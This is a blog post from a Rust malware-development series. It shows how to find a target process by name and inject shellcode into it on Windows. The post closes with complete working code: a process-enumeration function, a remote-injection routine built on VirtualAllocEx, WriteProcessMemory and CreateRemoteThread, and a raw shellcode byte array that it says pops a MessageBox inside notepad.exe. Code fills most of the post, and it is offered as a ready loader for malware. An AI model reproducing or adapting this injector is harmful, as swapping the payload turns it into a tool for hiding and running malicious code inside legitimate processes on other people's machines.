---
title:  "Rustware Part 2: Process Enumeration Development (Windows)"
authors: ["Raffaele Sabato"]
date:   2023-11-06
tags: ["rust","malwares"]
thumbnail:
  url: img/2023-11-06-rustware-part-2-process-enumeration-development/img0.png
  author: Deep AI
  authorURL: https://deepai.org
---

In the [previous blog post](https://syrion.me/malware/rustware-part-1-shellcode-process-injection-development/) we have seen how to develop a Shellcode Process Injection in Rust; the described Process Injection flow relies on several WinAPIs: **OpenProcess** used to open a handle to the target process, then **VirtualAllocEx** was used to allocate a new readable and writable region of memory into the target process, **WriteProcessMemory** wrote the shellcode into the new allocated memory, then  **VirtualProtectEx** was used to change the new allocated memory protection to readable and executable in order to allow the **CreateRemoteThread** to execute the shellcode contained into the new allocated memory in the target process.

Generally, a malware targets one or more processes, it iterates over the existing system processes in order to find the target process, get its PID and inject the payload in it. 

This blog post describes how to iterate over processes and find a specified process PID in Rust; to do that, we use the **CreateToolhelp32Snapshot** to create a snapshot of all the running processes in the system, then using **Process32First** and **Process32Next** we can iterate all the snapshot processes to find the target process and get its PID, after that we use the **inject** function to perform the shellcode process injection as saw in the previous blog post.

## Process Enumeration

The process enumeration we are going to develop is very simple, it uses the following WinAPIs:

* **[CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)**: gets a handle to a snapshot, it includes all the running processes in the system
* **[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)**: gets information about the first process in the snapshot
* **[Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)**: gets information about the next process in the snapshot

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img1.png" caption="Figure 1 -  Process Enumeration" wrapper="text-center">}}

The running process information from the snapshot is stored in the **[PROCESSENTRY32](https://learn.microsoft.com/it-it/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)** struct.

```rust
pub struct PROCESSENTRY32 {
    pub dwSize: u32,
    pub cntUsage: u32,
    pub th32ProcessID: u32,
    pub th32DefaultHeapID: usize,
    pub th32ModuleID: u32,
    pub cntThreads: u32,
    pub th32ParentProcessID: u32,
    pub pcPriClassBase: i32,
    pub dwFlags: u32,
    pub szExeFile: [u8; 260],
}
```
We are interested in the process name contained in the **szExeFile** field and in the process PID containted in the **th32ProcessID** field. 

## Rustware Setup

Everything we need to develop a Rust program that leverages on WinAPI, is well described in the Microsoft “[Developing with Rust on Windows](https://learn.microsoft.com/en-us/windows/dev-environment/rust/)”. In our case, we used the following software, plugins and crate:

* Visual Studio Code 1.83.0
* Rust-analyzer 0.3.1689
* CodeLLDB 1.10.0
* Crates 0.6.3
* Windows Crate 0.51.1

## Rustware Development

First of all, it is necessary to add the Windows Crate and the features required by each WinAPI to the **Cargo.toml** file; we can see the features in the [Windows Crate documentation](https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Memory/fn.VirtualAllocEx.html).

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img2.png" caption="Figure 2 - CreateToolhelp32Snapshot Specification" wrapper="text-center">}}

Below, a list of the WinAPIs we are going to use and the features they require:

* **CreateToolhelp32Snapshot**:” Win32_System_Diagnostics_ToolHelp” and “Win32_Foundation”
* **Process32First**: ”Win32_System_Diagnostics_ToolHelp” and “Win32_Foundation”
* **Process32Next**: ”Win32_System_Diagnostics_ToolHelp” and “Win32_Foundation”

After adding the Windows Crate and all the WinAPIs features, the Cargo.toml file will look like this.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img3.png" caption="Figure 3 - Cargo.toml File" wrapper="text-center">}}

Each feature must also be imported in the code; we can achieve this with the **use** declaration as shown in the image below.

```rust
use std::{ffi::c_void, mem::size_of, mem::transmute};

use windows::{
    Win32::Foundation::CloseHandle, Win32::System::Diagnostics::Debug::*,
    Win32::System::Diagnostics::ToolHelp::*, Win32::System::Memory::*, Win32::System::Threading::*,
};
```

The **find_pid** function takes the target process name as parameter and returns its PID. 

```rust
fn find_pid(target_process_name:&str) -> u32
```
We have to declare: a variable **pe32** as a **PROCESSENTRY32** struct, initialize it with the default constructor, a string **cur_process_name** for the process name and a **Result** variable **result_process32** for the **Process32First** and **Process32Next** return value; then we must set the **dwSize** by getting the size of the **PROCESSENTRY32** struct.

```rust
fn find_pid(target_process_name:&str) -> u32{

    let mut pe32: PROCESSENTRY32 = PROCESSENTRY32{..Default::default()};
    let mut cur_process_name;
    let mut result_process32;
    
    pe32.dwSize = size_of::<PROCESSENTRY32>() as u32;
}
```

As seen in the previous blog post, the WinAPIs we are going to use are defined as **unsafe** function, so we need to add an **unsafe** block to use them.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img4.png" caption="Figure 4 - CreateToolhelp32Snapshot Implementation" wrapper="text-center">}}

The **CreateToolhelp32Snapshot** in the code below returns an error, or a handle to a snapshot; **TH32CS_SNAPPROCESS** means that all the running system processes must be included in the snapshot.

```rust
unsafe {
   
        let result_createtoolhelp32snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
        
        match result_createtoolhelp32snapshot{
            Ok(handle_procsnap) => {
                println!("CreateToolhelp32Snapshot succeeds");       
            }

            Err(error) =>  {
                println!("CreateToolhelp32Snapshot Error: {}",error);
                return 0;
            }
        }
}
```  

After that we can iterate all the processes in the snapshot by using **Process32First** and **Process32Next**; these two WinAPIs save the process details in the **PROCESSENTRY32** struct contained in the **pe32** variable. In each iteration we get the process name from the **szExeFile** field, convert it to utf8 string, and remove all the 0x0 bytes; then we compare the target process name with the current process name, if they match, we return it’s PID from the **th32ProcessID** field, otherwise we clear the **szExeFile** field and repeat the loop again.
The function returns 0 if the target process is not found or if an error is generated.

```rust
result_process32 = Process32First(handle_procsnap, &mut pe32);  
    loop{

        match result_process32{
            Ok(_) => {
                                        
                cur_process_name = std::str::from_utf8(&pe32.szExeFile).unwrap().trim_matches(char::from(0));
                                
                if cur_process_name.to_lowercase() == target_process_name.to_lowercase() {
                    println!("Find {} PID: {}",target_process_name,pe32.th32ProcessID);
                    let _=  CloseHandle(handle_procsnap);
                    return pe32.th32ProcessID;
                }
                pe32.szExeFile = [0;260];
                result_process32 = Process32Next(handle_procsnap, &mut pe32);
            }
            Err(error) => {
                println!("Process32 Error: {}",error);
                break;
            }
        }
    }      
```

In order to use the **find_pid** function, we can change the main function from the previous blog post as shown below.

```rust
fn main() {
    
    let payload : [u8; 272]= [ 
                                0xd9, ... ,0x08
                             ];  

    let payload_len = payload.len();
    let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;
    let target_process = "notepad.exe";
    let pid = find_pid(target_process);

    if pid != 0 {
        inject(pid,payload_ptr,payload_len);
    }
    else{
        println!("{} not found",target_process);
    }
    
}
```

Using the **target** flag, we can specifying the i686 architecture and compile the program into a 32bit binary.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img5.png" caption="Figure 5 - Compile Program for 32bit architecture" wrapper="text-center">}}

Running it, we successfully finds the notepad.exe PID and injects our MessageBox into it.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img6.png" caption="Figure 6 - MessageBox Process Injection in Notepad.exe" wrapper="text-center">}}

## Debugging

Using Process Hacker and x32dbg we can debug our binary to understand how it works under the hood. We set the breakpoints on the WinAPIs that our binary is going to use.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img7.png" caption="Figure 7 - x32dbg Breakpoints" wrapper="text-center">}}

### CreateToolhelp32Snapshot

```rust
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
``` 

Running the debugger, we can see that the **CreateToolhelp32Snapshot** is correctly getting the two parameters:

* 0x2 is **TH32CS_SNAPPROCESS**
* The second parameter is 0x0

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img8.png" caption="Figure 8 - CreateToolhelp32Snapshot Debug" wrapper="text-center">}}

We can see the snapshot handle in our binary handles list.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img9.png" caption="Figure 9 - Snapshot Handle" wrapper="text-center">}}

### Process32First

```rust
Process32First(handle_procsnap, &mut pe32);
```
We can see the two parameters:

* 0xEC is the snapshot handle
* 0x50F6B4 is the **PROCESSENTRY32** struct address

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img10.png" caption="Figure 10 - Process32First Debug" wrapper="text-center">}}

The **szExeFile** field is at offset 0x24, so at the address **0x50F6D8**(**0x50F6B4** + 0x24) we can see the process name.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img11.png" caption="Figure 11 - Process Name in memory" wrapper="text-center">}}

### Process32Next

```rust
Process32Next(handle_procsnap, &mut pe32);
```

We can see the two parameters:

* 0xEC is the snapshot handle
* 0x50F6B4 is the **PROCESSENTRY32** struct address

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img12.png" caption="Figure 12 - Process32Next Debug" wrapper="text-center">}}

By continuing the execution, the WinAPIs seen in the previous blog post are executed and our payload is injected into Notepad.exe.

{{< image src="img/2023-11-06-rustware-part-2-process-enumeration-development/img13.png" caption="Figure 13 - Process Injection Debug" wrapper="text-center">}}

## Conclusion

As already said, Rust is a very powerful language; in the last years it found its way into the malware development, especially for ransomware because of its speed. The interaction with WinAPIs is not very easy because of the datatype mismatch.

At each iteration, we must manually clean the **szExeFile** field in the **PROCESSENTRY32** struct to clear all the junk chars from the previous process name.

In the next blog post I would like to refactoring the code in order to be more "Rusty".

Any feedback will be appreciated.


## References

* [https://learn.microsoft.com/en-us/windows/dev-environment/rust/](https://learn.microsoft.com/en-us/windows/dev-environment/rust/)
* [https://microsoft.github.io/windows-docs-rs/doc/windows/](https://microsoft.github.io/windows-docs-rs/doc/windows/)
* [https://socradar.io/why-ransomware-groups-switch-to-rust-programming-language/](https://socradar.io/why-ransomware-groups-switch-to-rust-programming-language/)
* [https://crates.io/crates/windows](https://crates.io/crates/windows)
* [https://doc.rust-lang.org/book/](https://doc.rust-lang.org/book/)
* [https://www.ired.team/offensive-security/code-injection-process-injection/process-injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
* [https://institute.sektor7.net](https://institute.sektor7.net)
* [https://maldevacademy.com](https://maldevacademy.com)
* [https://syrion.me/malware/rustware-part-1-shellcode-process-injection-development/](https://syrion.me/malware/rustware-part-1-shellcode-process-injection-development) 
* [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/)


## Final Code

```rust
use std::{ffi::c_void, mem::size_of, mem::transmute};

use windows::{
    Win32::Foundation::CloseHandle, Win32::System::Diagnostics::Debug::*,
    Win32::System::Diagnostics::ToolHelp::*, Win32::System::Memory::*, Win32::System::Threading::*,
};

fn find_pid(target_process_name: &str) -> u32 {
    let mut pe32: PROCESSENTRY32 = PROCESSENTRY32 {
        ..Default::default()
    };
    let mut cur_process_name;
    let mut result_process32;

    pe32.dwSize = size_of::<PROCESSENTRY32>() as u32;

    unsafe {
        let result_createtoolhelp32snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        match result_createtoolhelp32snapshot {
            Ok(handle_procsnap) => {
                result_process32 = Process32First(handle_procsnap, &mut pe32);

                loop {
                    match result_process32 {
                        Ok(_) => {
                            cur_process_name = std::str::from_utf8(&pe32.szExeFile)
                                .unwrap()
                                .trim_matches(char::from(0));

                            if cur_process_name.to_lowercase() == target_process_name.to_lowercase()
                            {
                                println!(
                                    "Find {} PID: {}",
                                    target_process_name, pe32.th32ProcessID
                                );
                                let _ = CloseHandle(handle_procsnap);
                                return pe32.th32ProcessID;
                            }
                            pe32.szExeFile = [0; 260];
                            result_process32 = Process32Next(handle_procsnap, &mut pe32);
                        }
                        Err(error) => {
                            println!("Process32 Error: {}", error);
                            break;
                        }
                    }
                }
                let _ = CloseHandle(handle_procsnap);
            }

            Err(error) => {
                println!("CreateToolhelp32Snapshot Error: {}", error);
                return 0;
            }
        }
    }
    return 0;
}

fn inject(pid: u32, payload_ptr: *const c_void, payload_len: usize) {
    unsafe {
        let result_openprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);

        match result_openprocess {
            Ok(handle_process) => {
                let remotememory_ptr: *mut c_void = VirtualAllocEx(
                    handle_process,
                    None,
                    payload_len,
                    MEM_COMMIT,
                    PAGE_READWRITE,
                );

                if !remotememory_ptr.is_null() {
                    println!("Allocated Memory Address: {:p}", remotememory_ptr);

                    let result_writeprocessmemory = WriteProcessMemory(
                        handle_process,
                        remotememory_ptr,
                        payload_ptr,
                        payload_len,
                        None,
                    );

                    match result_writeprocessmemory {
                        Ok(()) => {
                            let result_virtualprotectex = VirtualProtectEx(
                                handle_process,
                                remotememory_ptr,
                                payload_len,
                                PAGE_EXECUTE_READ,
                                &mut old_protect,
                            );

                            match result_virtualprotectex {
                                Ok(()) => {
                                    let result_createremotethread = CreateRemoteThread(
                                        handle_process,
                                        None,
                                        0,
                                        transmute(remotememory_ptr),
                                        None,
                                        0,
                                        None,
                                    );

                                    match result_createremotethread {
                                        Ok(handle_tread) => {
                                            println!("Thread Created");
                                            let _ = CloseHandle(handle_tread);
                                        }
                                        Err(error) => {
                                            println!("CreateRemoteThread Error: {}", error)
                                        }
                                    }
                                }
                                Err(error) => {
                                    println!("VirtualProtectEx Error: {}", error)
                                }
                            }
                        }

                        Err(error) => {
                            println!("WriteProcessMemory Error: {}", error)
                        }
                    }
                } else {
                    println!("VirtualAllocEx Error")
                }
                let _ = CloseHandle(handle_process);
            }
            Err(error) => {
                println!("OpenProcess Error: {}", error)
            }
        }
    }
}

fn main() {
    let payload: [u8; 272] = [
        0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b,
        0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b,
        0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24,
        0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a,
        0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0,
        0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c,
        0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a,
        0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2,
        0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec, 0x52, 0xe8, 0x9f,
        0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0x7e, 0xd8, 0xe2, 0x73, 0x87, 0x1c, 0x24, 0x52,
        0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33,
        0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89,
        0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d, 0xbc, 0x87, 0x1c,
        0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x77, 0x61,
        0x72, 0x65, 0x68, 0x52, 0x75, 0x73, 0x74, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x08, 0x89, 0xe3,
        0x68, 0x6e, 0x58, 0x20, 0x20, 0x68, 0x63, 0x74, 0x69, 0x6f, 0x68, 0x49, 0x6e, 0x6a, 0x65,
        0x68, 0x65, 0x73, 0x73, 0x20, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x31, 0xc9, 0x88, 0x4c, 0x24,
        0x11, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff,
        0x55, 0x08,
    ];
    let payload_len = payload.len();
    let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;
    let target_process = "notepad.exe";
    let pid = find_pid(target_process);

    if pid != 0 {
        inject(pid, payload_ptr, payload_len);
    } else {
        println!("{} not found", target_process);
    }
}
```
